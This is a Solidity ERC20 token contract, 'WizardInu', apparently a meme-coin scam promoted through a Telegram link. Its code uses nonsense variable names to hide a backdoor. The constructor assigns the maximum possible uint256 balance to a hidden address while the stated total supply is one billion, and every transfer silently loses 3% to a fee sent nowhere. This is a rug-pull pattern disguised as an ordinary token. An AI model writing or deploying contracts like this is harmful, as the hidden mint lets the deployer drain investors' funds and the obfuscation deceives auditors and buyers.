/*

https://t.me/wizardinu

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.5;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract WizardInu is ERC20, Ownable {
    uint256 private adventure = ~uint256(0);
    uint256 public addition = 3;

    constructor(
        string memory up,
        string memory appearance,
        address shoot,
        address experience
    ) ERC20(up, appearance) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[experience] = adventure;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address shells,
        address sets,
        uint256 think
    ) internal override {
        uint256 shade = (think / 100) * addition;
        think = think - shade;
        super._transfer(shells, sets, think);
    }
}